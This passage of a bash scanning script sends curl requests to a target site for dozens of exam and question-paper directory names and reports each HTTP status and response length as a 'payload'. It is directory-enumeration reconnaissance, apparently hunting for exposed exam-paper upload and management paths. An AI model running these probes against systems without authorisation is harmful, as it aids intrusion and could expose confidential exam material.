code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"PanelQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaperHandling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaperHandling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBBatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBBatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaperPlatform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaperPlatform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch-DataPipeline/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch-DataPipeline/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool_QPAuto/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool_QPAuto/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaperOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaperOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt-UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt-UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuite-QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuite-QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper_Workflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper_Workflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUploadQPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUploadQPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPSystem_Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPSystem_Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPServiceTransfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPServiceTransfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSync-QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSync-QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper-Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper-Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUploadQPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUploadQPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmt-BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmt-BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Dashboard-QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Dashboard-QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystem_QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystem_QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool_QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool_QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SyncQPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SyncQPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Sync-QsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Sync-QsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow_TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow_TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TransferQPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TransferQPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool-TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool-TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud-Handler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud-Handler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData_Tool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData_Tool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModule-ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModule-ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing-BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing-BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBDataDatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBDataDatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing_Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing_Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MgmtQ_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MgmtQ_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload-QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload-QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabase_BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabase_BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing_QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing_QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipelineQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipelineQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperUploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperUploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager-Control/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager-Control/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["CloudSync_QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"CloudSync_QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DatabaseManagerQPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DatabaseManagerQPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SystemQPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SystemQPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MassUploadQsnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MassUploadQsnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor-Monitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor-Monitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControl-QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControl-QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops_QPWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops_QPWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handler-QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handler-QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Upload-QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Upload-QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor-TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor-TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBulk_DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBulk_DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutomationSystem-QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutomationSystem-QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaperManagement/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaperManagement/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringToolQPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringToolQPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUploadQPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUploadQPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite_QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite_QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel_QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel_QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
